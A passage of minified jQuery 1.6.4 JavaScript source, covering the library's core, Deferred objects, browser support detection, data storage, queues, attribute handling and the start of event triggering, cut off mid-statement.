d=="string"){try{d=d==="true"?!0:d==="false"?!1:d==="null"?null:f.isNaN(d)?i.test(d)?f.parseJSON(d):d:parseFloat(d)}catch(g){}f.data(a,c,d)}else d=b}return d}var c=a.document,d=a.navigator,e=a.location,f=function(){function K(){if(!e.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(K,1);return}e.ready()}}var e=function(a,b){return new e.fn.init(a,b,h)},f=a.jQuery,g=a.$,h,i=/^(?:[^#<]*(<[\w\W]+>)[^>]*$|#([\w\-]*)$)/,j=/\S/,k=/^\s+/,l=/\s+$/,m=/\d/,n=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,o=/^[\],:{}\s]*$/,p=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,q=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,r=/(?:^|:|,)(?:\s*\[)+/g,s=/(webkit)[ \/]([\w.]+)/,t=/(opera)(?:.*version)?[ \/]([\w.]+)/,u=/(msie) ([\w.]+)/,v=/(mozilla)(?:.*? rv:([\w.]+))?/,w=/-([a-z]|[0-9])/ig,x=/^-ms-/,y=function(a,b){return(b+"").toUpperCase()},z=d.userAgent,A,B,C,D=Object.prototype.toString,E=Object.prototype.hasOwnProperty,F=Array.prototype.push,G=Array.prototype.slice,H=String.prototype.trim,I=Array.prototype.indexOf,J={};e.fn=e.prototype={constructor:e,init:function(a,d,f){var g,h,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!d&&c.body){this.context=c,this[0]=c.body,this.selector=a,this.length=1;return this}if(typeof a=="string"){a.charAt(0)!=="<"||a.charAt(a.length-1)!==">"||a.length<3?g=i.exec(a):g=[null,a,null];if(g&&(g[1]||!d)){if(g[1]){d=d instanceof e?d[0]:d,k=d?d.ownerDocument||d:c,j=n.exec(a),j?e.isPlainObject(d)?(a=[c.createElement(j[1])],e.fn.attr.call(a,d,!0)):a=[k.createElement(j[1])]:(j=e.buildFragment([g[1]],[k]),a=(j.cacheable?e.clone(j.fragment):j.fragment).childNodes);return e.merge(this,a)}h=c.getElementById(g[2]);if(h&&h.parentNode){if(h.id!==g[2])return f.find(a);this.length=1,this[0]=h}this.context=c,this.selector=a;return this}return!d||d.jquery?(d||f).find(a):this.constructor(d).find(a)}if(e.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return e.makeArray(a,this)},selector:"",jquery:"1.6.4",length:0,size:function(){return this.length},toArray:function(){return G.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var d=this.constructor();e.isArray(a)?F.apply(d,a):e.merge(d,a),d.prevObject=this,d.context=this.context,b==="find"?d.selector=this.selector+(this.selector?" ":"")+c:b&&(d.selector=this.selector+"."+b+"("+c+")");return d},each:function(a,b){return e.each(this,a,b)},ready:function(a){e.bindReady(),B.done(a);return this},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(G.apply(this,arguments),"slice",G.call(arguments).join(","))},map:function(a){return this.pushStack(e.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:F,sort:[].sort,splice:[].splice},e.fn.init.prototype=e.fn,e.extend=e.fn.extend=function(){var a,c,d,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i=="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!="object"&&!e.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){d=i[c],f=a[c];if(i===f)continue;l&&f&&(e.isPlainObject(f)||(g=e.isArray(f)))?(g?(g=!1,h=d&&e.isArray(d)?d:[]):h=d&&e.isPlainObject(d)?d:{},i[c]=e.extend(l,h,f)):f!==b&&(i[c]=f)}return i},e.extend({noConflict:function(b){a.$===e&&(a.$=g),b&&a.jQuery===e&&(a.jQuery=f);return e},isReady:!1,readyWait:1,holdReady:function(a){a?e.readyWait++:e.ready(!0)},ready:function(a){if(a===!0&&!--e.readyWait||a!==!0&&!e.isReady){if(!c.body)return setTimeout(e.ready,1);e.isReady=!0;if(a!==!0&&--e.readyWait>0)return;B.resolveWith(c,[e]),e.fn.trigger&&e(c).trigger("ready").unbind("ready")}},bindReady:function(){if(!B){B=e._Deferred();if(c.readyState==="complete")return setTimeout(e.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",C,!1),a.addEventListener("load",e.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",C),a.attachEvent("onload",e.ready);var b=!1;try{b=a.frameElement==null}catch(d){}c.documentElement.doScroll&&b&&K()}}},isFunction:function(a){return e.type(a)==="function"},isArray:Array.isArray||function(a){return e.type(a)==="array"},isWindow:function(a){return a&&typeof a=="object"&&"setInterval"in a},isNaN:function(a){return a==null||!m.test(a)||isNaN(a)},type:function(a){return a==null?String(a):J[D.call(a)]||"object"},isPlainObject:function(a){if(!a||e.type(a)!=="object"||a.nodeType||e.isWindow(a))return!1;try{if(a.constructor&&!E.call(a,"constructor")&&!E.call(a.constructor.prototype,"isPrototypeOf"))return!1}catch(c){return!1}var d;for(d in a);return d===b||E.call(a,d)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw a},parseJSON:function(b){if(typeof b!="string"||!b)return null;b=e.trim(b);if(a.JSON&&a.JSON.parse)return a.JSON.parse(b);if(o.test(b.replace(p,"@").replace(q,"]").replace(r,"")))return(new Function("return "+b))();e.error("Invalid JSON: "+b)},parseXML:function(c){var d,f;try{a.DOMParser?(f=new DOMParser,d=f.parseFromString(c,"text/xml")):(d=new ActiveXObject("Microsoft.XMLDOM"),d.async="false",d.loadXML(c))}catch(g){d=b}(!d||!d.documentElement||d.getElementsByTagName("parsererror").length)&&e.error("Invalid XML: "+c);return d},noop:function(){},globalEval:function(b){b&&j.test(b)&&(a.execScript||function(b){a.eval.call(a,b)})(b)},camelCase:function(a){return a.replace(x,"ms-").replace(w,y)},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,d){var f,g=0,h=a.length,i=h===b||e.isFunction(a);if(d){if(i){for(f in a)if(c.apply(a[f],d)===!1)break}else for(;g<h;)if(c.apply(a[g++],d)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(;g<h;)if(c.call(a[g],g,a[g++])===!1)break;return a},trim:H?function(a){return a==null?"":H.call(a)}:function(a){return a==null?"":(a+"").replace(k,"").replace(l,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var d=e.type(a);a.length==null||d==="string"||d==="function"||d==="regexp"||e.isWindow(a)?F.call(c,a):e.merge(c,a)}return c},inArray:function(a,b){if(!b)return-1;if(I)return I.call(b,a);for(var c=0,d=b.length;c<d;c++)if(b[c]===a)return c;return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length=="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,c,d){var f,g,h=[],i=0,j=a.length,k=a instanceof e||j!==b&&typeof j=="number"&&(j>0&&a[0]&&a[j-1]||j===0||e.isArray(a));if(k)for(;i<j;i++)f=c(a[i],i,d),f!=null&&(h[h.length]=f);else for(g in a)f=c(a[g],g,d),f!=null&&(h[h.length]=f);return h.concat.apply([],h)},guid:1,proxy:function(a,c){if(typeof c=="string"){var d=a[c];c=a,a=d}if(!e.isFunction(a))return b;var f=G.call(arguments,2),g=function(){return a.apply(c,f.concat(G.call(arguments)))};g.guid=a.guid=a.guid||g.guid||e.guid++;return g},access:function(a,c,d,f,g,h){var i=a.length;if(typeof c=="object"){for(var j in c)e.access(a,j,c[j],f,g,d);return a}if(d!==b){f=!h&&f&&e.isFunction(d);for(var k=0;k<i;k++)g(a[k],c,f?d.call(a[k],k,g(a[k],c)):d,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=s.exec(a)||t.exec(a)||u.exec(a)||a.indexOf("compatible")<0&&v.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}e.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.sub=this.sub,a.fn.init=function(d,f){f&&f instanceof e&&!(f instanceof a)&&(f=a(f));return e.fn.init.call(this,d,f,b)},a.fn.init.prototype=a.fn;var b=a(c);return a},browser:{}}),e.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){J["[object "+b+"]"]=b.toLowerCase()}),A=e.uaMatch(z),A.browser&&(e.browser[A.browser]=!0,e.browser.version=A.version),e.browser.webkit&&(e.browser.safari=!0),j.test(" ")&&(k=/^[\s\xA0]+/,l=/[\s\xA0]+$/),h=e(c),c.addEventListener?C=function(){c.removeEventListener("DOMContentLoaded",C,!1),e.ready()}:c.attachEvent&&(C=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",C),e.ready())});return e}(),g="done fail isResolved isRejected promise then always pipe".split(" "),h=[].slice;f.extend({_Deferred:function(){var a=[],b,c,d,e={done:function(){if(!d){var c=arguments,g,h,i,j,k;b&&(k=b,b=0);for(g=0,h=c.length;g<h;g++)i=c[g],j=f.type(i),j==="array"?e.done.apply(e,i):j==="function"&&a.push(i);k&&e.resolveWith(k[0],k[1])}return this},resolveWith:function(e,f){if(!d&&!b&&!c){f=f||[],c=1;try{while(a[0])a.shift().apply(e,f)}finally{b=[e,f],c=0}}return this},resolve:function(){e.resolveWith(this,arguments);return this},isResolved:function(){return!!c||!!b},cancel:function(){d=1,a=[];return this}};return e},Deferred:function(a){var b=f._Deferred(),c=f._Deferred(),d;f.extend(b,{then:function(a,c){b.done(a).fail(c);return this},always:function(){return b.done.apply(b,arguments).fail.apply(this,arguments)},fail:c.done,rejectWith:c.resolveWith,reject:c.resolve,isRejected:c.isResolved,pipe:function(a,c){return f.Deferred(function(d){f.each({done:[a,"resolve"],fail:[c,"reject"]},function(a,c){var e=c[0],g=c[1],h;f.isFunction(e)?b[a](function(){h=e.apply(this,arguments),h&&f.isFunction(h.promise)?h.promise().then(d.resolve,d.reject):d[g+"With"](this===b?d:this,[h])}):b[a](d[g])})}).promise()},promise:function(a){if(a==null){if(d)return d;d=a={}}var c=g.length;while(c--)a[g[c]]=b[g[c]];return a}}),b.done(c.cancel).fail(b.cancel),delete b.cancel,a&&a.call(b,b);return b},when:function(a){function i(a){return function(c){b[a]=arguments.length>1?h.call(arguments,0):c,--e||g.resolveWith(g,h.call(b,0))}}var b=arguments,c=0,d=b.length,e=d,g=d<=1&&a&&f.isFunction(a.promise)?a:f.Deferred();if(d>1){for(;c<d;c++)b[c]&&f.isFunction(b[c].promise)?b[c].promise().then(i(c),g.reject):--e;e||g.resolveWith(g,b)}else g!==a&&g.resolveWith(g,d?[a]:[]);return g.promise()}}),f.support=function(){var a=c.createElement("div"),b=c.documentElement,d,e,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u;a.setAttribute("className","t"),a.innerHTML="  <link/><table></table><a href='/a' style='top:1px;float:left;opacity:.55;'>a</a><input type='checkbox'/>",d=a.getElementsByTagName("*"),e=a.getElementsByTagName("a")[0];if(!d||!d.length||!e)return{};g=c.createElement("select"),h=g.appendChild(c.createElement("option")),i=a.getElementsByTagName("input")[0],k={leadingWhitespace:a.firstChild.nodeType===3,tbody:!a.getElementsByTagName("tbody").length,htmlSerialize:!!a.getElementsByTagName("link").length,style:/top/.test(e.getAttribute("style")),hrefNormalized:e.getAttribute("href")==="/a",opacity:/^0.55$/.test(e.style.opacity),cssFloat:!!e.style.cssFloat,checkOn:i.value==="on",optSelected:h.selected,getSetAttribute:a.className!=="t",submitBubbles:!0,changeBubbles:!0,focusinBubbles:!1,deleteExpando:!0,noCloneEvent:!0,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableMarginRight:!0},i.checked=!0,k.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,k.optDisabled=!h.disabled;try{delete a.test}catch(v){k.deleteExpando=!1}!a.addEventListener&&a.attachEvent&&a.fireEvent&&(a.attachEvent("onclick",function(){k.noCloneEvent=!1}),a.cloneNode(!0).fireEvent("onclick")),i=c.createElement("input"),i.value="t",i.setAttribute("type","radio"),k.radioValue=i.value==="t",i.setAttribute("checked","checked"),a.appendChild(i),l=c.createDocumentFragment(),l.appendChild(a.firstChild),k.checkClone=l.cloneNode(!0).cloneNode(!0).lastChild.checked,a.innerHTML="",a.style.width=a.style.paddingLeft="1px",m=c.getElementsByTagName("body")[0],o=c.createElement(m?"div":"body"),p={visibility:"hidden",width:0,height:0,border:0,margin:0,background:"none"},m&&f.extend(p,{position:"absolute",left:"-1000px",top:"-1000px"});for(t in p)o.style[t]=p[t];o.appendChild(a),n=m||b,n.insertBefore(o,n.firstChild),k.appendChecked=i.checked,k.boxModel=a.offsetWidth===2,"zoom"in a.style&&(a.style.display="inline",a.style.zoom=1,k.inlineBlockNeedsLayout=a.offsetWidth===2,a.style.display="",a.innerHTML="<div style='width:4px;'></div>",k.shrinkWrapBlocks=a.offsetWidth!==2),a.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>",q=a.getElementsByTagName("td"),u=q[0].offsetHeight===0,q[0].style.display="",q[1].style.display="none",k.reliableHiddenOffsets=u&&q[0].offsetHeight===0,a.innerHTML="",c.defaultView&&c.defaultView.getComputedStyle&&(j=c.createElement("div"),j.style.width="0",j.style.marginRight="0",a.appendChild(j),k.reliableMarginRight=(parseInt((c.defaultView.getComputedStyle(j,null)||{marginRight:0}).marginRight,10)||0)===0),o.innerHTML="",n.removeChild(o);if(a.attachEvent)for(t in{submit:1,change:1,focusin:1})s="on"+t,u=s in a,u||(a.setAttribute(s,"return;"),u=typeof a[s]=="function"),k[t+"Bubbles"]=u;o=l=g=h=m=j=a=i=null;return k}(),f.boxModel=f.support.boxModel;var i=/^(?:\{.*\}|\[.*\])$/,j=/([A-Z])/g;f.extend({cache:{},uuid:0,expando:"jQuery"+(f.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?f.cache[a[f.expando]]:a[f.expando];return!!a&&!l(a)},data:function(a,c,d,e){if(!!f.acceptData(a)){var g,h,i=f.expando,j=typeof c=="string",k=a.nodeType,l=k?f.cache:a,m=k?a[f.expando]:a[f.expando]&&f.expando;if((!m||e&&m&&l[m]&&!l[m][i])&&j&&d===b)return;m||(k?a[f.expando]=m=++f.uuid:m=f.expando),l[m]||(l[m]={},k||(l[m].toJSON=f.noop));if(typeof c=="object"||typeof c=="function")e?l[m][i]=f.extend(l[m][i],c):l[m]=f.extend(l[m],c);g=l[m],e&&(g[i]||(g[i]={}),g=g[i]),d!==b&&(g[f.camelCase(c)]=d);if(c==="events"&&!g[c])return g[i]&&g[i].events;j?(h=g[c],h==null&&(h=g[f.camelCase(c)])):h=g;return h}},removeData:function(a,b,c){if(!!f.acceptData(a)){var d,e=f.expando,g=a.nodeType,h=g?f.cache:a,i=g?a[f.expando]:f.expando;if(!h[i])return;if(b){d=c?h[i][e]:h[i];if(d){d[b]||(b=f.camelCase(b)),delete d[b];if(!l(d))return}}if(c){delete h[i][e];if(!l(h[i]))return}var j=h[i][e];f.support.deleteExpando||!h.setInterval?delete h[i]:h[i]=null,j?(h[i]={},g||(h[i].toJSON=f.noop),h[i][e]=j):g&&(f.support.deleteExpando?delete a[f.expando]:a.removeAttribute?a.removeAttribute(f.expando):a[f.expando]=null)}},_data:function(a,b,c){return f.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=f.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),f.fn.extend({data:function(a,c){var d=null;if(typeof a=="undefined"){if(this.length){d=f.data(this[0]);if(this[0].nodeType===1){var e=this[0].attributes,g;for(var h=0,i=e.length;h<i;h++)g=e[h].name,g.indexOf("data-")===0&&(g=f.camelCase(g.substring(5)),k(this[0],g,d[g]))}}return d}if(typeof a=="object")return this.each(function(){f.data(this,a)});var j=a.split(".");j[1]=j[1]?"."+j[1]:"";if(c===b){d=this.triggerHandler("getData"+j[1]+"!",[j[0]]),d===b&&this.length&&(d=f.data(this[0],a),d=k(this[0],a,d));return d===b&&j[1]?this.data(j[0]):d}return this.each(function(){var b=f(this),d=[j[0],c];b.triggerHandler("setData"+j[1]+"!",d),f.data(this,a,c),b.triggerHandler("changeData"+j[1]+"!",d)})},removeData:function(a){return this.each(function(){f.removeData(this,a)})}}),f.extend({_mark:function(a,c){a&&(c=(c||"fx")+"mark",f.data(a,c,(f.data(a,c,b,!0)||0)+1,!0))},_unmark:function(a,c,d){a!==!0&&(d=c,c=a,a=!1);if(c){d=d||"fx";var e=d+"mark",g=a?0:(f.data(c,e,b,!0)||1)-1;g?f.data(c,e,g,!0):(f.removeData(c,e,!0),m(c,d,"mark"))}},queue:function(a,c,d){if(a){c=(c||"fx")+"queue";var e=f.data(a,c,b,!0);d&&(!e||f.isArray(d)?e=f.data(a,c,f.makeArray(d),!0):e.push(d));return e||[]}},dequeue:function(a,b){b=b||"fx";var c=f.queue(a,b),d=c.shift(),e;d==="inprogress"&&(d=c.shift()),d&&(b==="fx"&&c.unshift("inprogress"),d.call(a,function(){f.dequeue(a,b)})),c.length||(f.removeData(a,b+"queue",!0),m(a,b,"queue"))}}),f.fn.extend({queue:function(a,c){typeof a!="string"&&(c=a,a="fx");if(c===b)return f.queue(this[0],a);return this.each(function(){var b=f.queue(this,a,c);a==="fx"&&b[0]!=="inprogress"&&f.dequeue(this,a)})},dequeue:function(a){return this.each(function(){f.dequeue(this,a)})},delay:function(a,b){a=f.fx?f.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(){var c=this;setTimeout(function(){f.dequeue(c,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,c){function m(){--h||d.resolveWith(e,[e])}typeof a!="string"&&(c=a,a=b),a=a||"fx";var d=f.Deferred(),e=this,g=e.length,h=1,i=a+"defer",j=a+"queue",k=a+"mark",l;while(g--)if(l=f.data(e[g],i,b,!0)||(f.data(e[g],j,b,!0)||f.data(e[g],k,b,!0))&&f.data(e[g],i,f._Deferred(),!0))h++,l.done(m);m();return d.promise()}});var n=/[\n\t\r]/g,o=/\s+/,p=/\r/g,q=/^(?:button|input)$/i,r=/^(?:button|input|object|select|textarea)$/i,s=/^a(?:rea)?$/i,t=/^(?:autofocus|autoplay|async|checked|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped|selected)$/i,u,v;f.fn.extend({attr:function(a,b){return f.access(this,a,b,!0,f.attr)},removeAttr:function(a){return this.each(function(){f.removeAttr(this,a)})},prop:function(a,b){return f.access(this,a,b,!0,f.prop)},removeProp:function(a){a=f.propFix[a]||a;return this.each(function(){try{this[a]=b,delete this[a]}catch(c){}})},addClass:function(a){var b,c,d,e,g,h,i;if(f.isFunction(a))return this.each(function(b){f(this).addClass(a.call(this,b,this.className))});if(a&&typeof a=="string"){b=a.split(o);for(c=0,d=this.length;c<d;c++){e=this[c];if(e.nodeType===1)if(!e.className&&b.length===1)e.className=a;else{g=" "+e.className+" ";for(h=0,i=b.length;h<i;h++)~g.indexOf(" "+b[h]+" ")||(g+=b[h]+" ");e.className=f.trim(g)}}}return this},removeClass:function(a){var c,d,e,g,h,i,j;if(f.isFunction(a))return this.each(function(b){f(this).removeClass(a.call(this,b,this.className))});if(a&&typeof a=="string"||a===b){c=(a||"").split(o);for(d=0,e=this.length;d<e;d++){g=this[d];if(g.nodeType===1&&g.className)if(a){h=(" "+g.className+" ").replace(n," ");for(i=0,j=c.length;i<j;i++)h=h.replace(" "+c[i]+" "," ");g.className=f.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,d=typeof b=="boolean";if(f.isFunction(a))return this.each(function(c){f(this).toggleClass(a.call(this,c,this.className,b),b)});return this.each(function(){if(c==="string"){var e,g=0,h=f(this),i=b,j=a.split(o);while(e=j[g++])i=d?i:!h.hasClass(e),h[i?"addClass":"removeClass"](e)}else if(c==="undefined"||c==="boolean")this.className&&f._data(this,"__className__",this.className),this.className=this.className||a===!1?"":f._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ";for(var c=0,d=this.length;c<d;c++)if(this[c].nodeType===1&&(" "+this[c].className+" ").replace(n," ").indexOf(b)>-1)return!0;return!1},val:function(a){var c,d,e=this[0];if(!arguments.length){if(e){c=f.valHooks[e.nodeName.toLowerCase()]||f.valHooks[e.type];if(c&&"get"in c&&(d=c.get(e,"value"))!==b)return d;d=e.value;return typeof d=="string"?d.replace(p,""):d==null?"":d}return b}var g=f.isFunction(a);return this.each(function(d){var e=f(this),h;if(this.nodeType===1){g?h=a.call(this,d,e.val()):h=a,h==null?h="":typeof h=="number"?h+="":f.isArray(h)&&(h=f.map(h,function(a){return a==null?"":a+""})),c=f.valHooks[this.nodeName.toLowerCase()]||f.valHooks[this.type];if(!c||!("set"in c)||c.set(this,h,"value")===b)this.value=h}})}}),f.extend({valHooks:{option:{get:function(a){var b=a.attributes.value;return!b||b.specified?a.value:a.text}},select:{get:function(a){var b,c=a.selectedIndex,d=[],e=a.options,g=a.type==="select-one";if(c<0)return null;for(var h=g?c:0,i=g?c+1:e.length;h<i;h++){var j=e[h];if(j.selected&&(f.support.optDisabled?!j.disabled:j.getAttribute("disabled")===null)&&(!j.parentNode.disabled||!f.nodeName(j.parentNode,"optgroup"))){b=f(j).val();if(g)return b;d.push(b)}}if(g&&!d.length&&e.length)return f(e[c]).val();return d},set:function(a,b){var c=f.makeArray(b);f(a).find("option").each(function(){this.selected=f.inArray(f(this).val(),c)>=0}),c.length||(a.selectedIndex=-1);return c}}},attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attrFix:{tabindex:"tabIndex"},attr:function(a,c,d,e){var g=a.nodeType;if(!a||g===3||g===8||g===2)return b;if(e&&c in f.attrFn)return f(a)[c](d);if(!("getAttribute"in a))return f.prop(a,c,d);var h,i,j=g!==1||!f.isXMLDoc(a);j&&(c=f.attrFix[c]||c,i=f.attrHooks[c],i||(t.test(c)?i=v:u&&(i=u)));if(d!==b){if(d===null){f.removeAttr(a,c);return b}if(i&&"set"in i&&j&&(h=i.set(a,d,c))!==b)return h;a.setAttribute(c,""+d);return d}if(i&&"get"in i&&j&&(h=i.get(a,c))!==null)return h;h=a.getAttribute(c);return h===null?b:h},removeAttr:function(a,b){var c;a.nodeType===1&&(b=f.attrFix[b]||b,f.attr(a,b,""),a.removeAttribute(b),t.test(b)&&(c=f.propFix[b]||b)in a&&(a[c]=!1))},attrHooks:{type:{set:function(a,b){if(q.test(a.nodeName)&&a.parentNode)f.error("type property can't be changed");else if(!f.support.radioValue&&b==="radio"&&f.nodeName(a,"input")){var c=a.value;a.setAttribute("type",b),c&&(a.value=c);return b}}},value:{get:function(a,b){if(u&&f.nodeName(a,"button"))return u.get(a,b);return b in a?a.value:null},set:function(a,b,c){if(u&&f.nodeName(a,"button"))return u.set(a,b,c);a.value=b}}},propFix:{tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"},prop:function(a,c,d){var e=a.nodeType;if(!a||e===3||e===8||e===2)return b;var g,h,i=e!==1||!f.isXMLDoc(a);i&&(c=f.propFix[c]||c,h=f.propHooks[c]);return d!==b?h&&"set"in h&&(g=h.set(a,d,c))!==b?g:a[c]=d:h&&"get"in h&&(g=h.get(a,c))!==null?g:a[c]},propHooks:{tabIndex:{get:function(a){var c=a.getAttributeNode("tabindex");return c&&c.specified?parseInt(c.value,10):r.test(a.nodeName)||s.test(a.nodeName)&&a.href?0:b}}}}),f.attrHooks.tabIndex=f.propHooks.tabIndex,v={get:function(a,c){var d;return f.prop(a,c)===!0||(d=a.getAttributeNode(c))&&d.nodeValue!==!1?c.toLowerCase():b},set:function(a,b,c){var d;b===!1?f.removeAttr(a,c):(d=f.propFix[c]||c,d in a&&(a[d]=!0),a.setAttribute(c,c.toLowerCase()));return c}},f.support.getSetAttribute||(u=f.valHooks.button={get:function(a,c){var d;d=a.getAttributeNode(c);return d&&d.nodeValue!==""?d.nodeValue:b},set:function(a,b,d){var e=a.getAttributeNode(d);e||(e=c.createAttribute(d),a.setAttributeNode(e));return e.nodeValue=b+""}},f.each(["width","height"],function(a,b){f.attrHooks[b]=f.extend(f.attrHooks[b],{set:function(a,c){if(c===""){a.setAttribute(b,"auto");return c}}})})),f.support.hrefNormalized||f.each(["href","src","width","height"],function(a,c){f.attrHooks[c]=f.extend(f.attrHooks[c],{get:function(a){var d=a.getAttribute(c,2);return d===null?b:d}})}),f.support.style||(f.attrHooks.style={get:function(a){return a.style.cssText.toLowerCase()||b},set:function(a,b){return a.style.cssText=""+b}}),f.support.optSelected||(f.propHooks.selected=f.extend(f.propHooks.selected,{get:function(a){var b=a.parentNode;b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex);return null}})),f.support.checkOn||f.each(["radio","checkbox"],function(){f.valHooks[this]={get:function(a){return a.getAttribute("value")===null?"on":a.value}}}),f.each(["radio","checkbox"],function(){f.valHooks[this]=f.extend(f.valHooks[this],{set:function(a,b){if(f.isArray(b))return a.checked=f.inArray(f(a).val(),b)>=0}})});var w=/\.(.*)$/,x=/^(?:textarea|input|select)$/i,y=/\./g,z=/ /g,A=/[^\w\s.|`]/g,B=function(a){return a.replace(A,"\\$&")};f.event={add:function(a,c,d,e){if(a.nodeType!==3&&a.nodeType!==8){if(d===!1)d=C;else if(!d)return;var g,h;d.handler&&(g=d,d=g.handler),d.guid||(d.guid=f.guid++);var i=f._data(a);if(!i)return;var j=i.events,k=i.handle;j||(i.events=j={}),k||(i.handle=k=function(a){return typeof f!="undefined"&&(!a||f.event.triggered!==a.type)?f.event.handle.apply(k.elem,arguments):b}),k.elem=a,c=c.split(" ");var l,m=0,n;while(l=c[m++]){h=g?f.extend({},g):{handler:d,data:e},l.indexOf(".")>-1?(n=l.split("."),l=n.shift(),h.namespace=n.slice(0).sort().join(".")):(n=[],h.namespace=""),h.type=l,h.guid||(h.guid=d.guid);var o=j[l],p=f.event.special[l]||{};if(!o){o=j[l]=[];if(!p.setup||p.setup.call(a,e,n,k)===!1)a.addEventListener?a.addEventListener(l,k,!1):a.attachEvent&&a.attachEvent("on"+l,k)}p.add&&(p.add.call(a,h),h.handler.guid||(h.handler.guid=d.guid)),o.push(h),f.event.global[l]=!0}a=null}},global:{},remove:function(a,c,d,e){if(a.nodeType!==3&&a.nodeType!==8){d===!1&&(d=C);var g,h,i,j,k=0,l,m,n,o,p,q,r,s=f.hasData(a)&&f._data(a),t=s&&s.events;if(!s||!t)return;c&&c.type&&(d=c.handler,c=c.type);if(!c||typeof c=="string"&&c.charAt(0)==="."){c=c||"";for(h in t)f.event.remove(a,h+c);return}c=c.split(" ");while(h=c[k++]){r=h,q=null,l=h.indexOf(".")<0,m=[],l||(m=h.split("."),h=m.shift(),n=new RegExp("(^|\\.)"+f.map(m.slice(0).sort(),B).join("\\.(?:.*\\.)?")+"(\\.|$)")),p=t[h];if(!p)continue;if(!d){for(j=0;j<p.length;j++){q=p[j];if(l||n.test(q.namespace))f.event.remove(a,r,q.handler,j),p.splice(j--,1)}continue}o=f.event.special[h]||{};for(j=e||0;j<p.length;j++){q=p[j];if(d.guid===q.guid){if(l||n.test(q.namespace))e==null&&p.splice(j--,1),o.remove&&o.remove.call(a,q);if(e!=null)break}}if(p.length===0||e!=null&&p.length===1)(!o.teardown||o.teardown.call(a,m)===!1)&&f.removeEvent(a,h,s.handle),g=null,delete t[h]}if(f.isEmptyObject(t)){var u=s.handle;u&&(u.elem=null),delete s.events,delete s.handle,f.isEmptyObject(s)&&f.removeData(a,b,!0)}}},customEvent:{getData:!0,setData:!0,changeData:!0},trigger:function(c,d,e,g){var h=c.type||c,i=[],j;h.indexOf("!")>=0&&(h=h.slice(0,-1),j=!0),h.indexOf(".")>=0&&(i=h.split("."),h=i.shift(),i.sort());if(!!e&&!f.event.customEvent[h]||!!f.event.global[h]){c=typeof c=="object"?c[f.expando]?c:new f.Event(h,c):new f.Event(h),c.type=h,c.exclusive=j,c.namespace=i.join("."),c.namespace_re=new RegExp("(^|\\.)"+i.join("\\.(?:.*\\.)?")+"(\\.|$)");if(g||!e)c.preventDefault(),c.stopPropagation();if(!e){f.each(f.cache,function(){var a=f.expando,b=this[a];b&&b.events&&b.events[h]&&f.event.trigger(c,d,b.handle.elem)});return}if(e.nodeType===3||e.nodeType===8)return;c.result=b,c.target=e,d=d!=null?f.makeArray(d):[],d.unshift(c);var k=e,l=h.indexOf(":")<0?"on"+h:"";do{var m=f._data(k,"handle");c.current_target=k,m&&m.apply(k,d),l&&f.acceptData(k)&&k[l]&&k[l].apply(k,d)===!1&&(c.result=!1,c.preventDefault()),k=k.parentNode||k.ownerDocument||k===c.target.ownerDocument&&a}while(k&&!c.isPropagationStopped());if(!c.isDefaultPrevented()){var 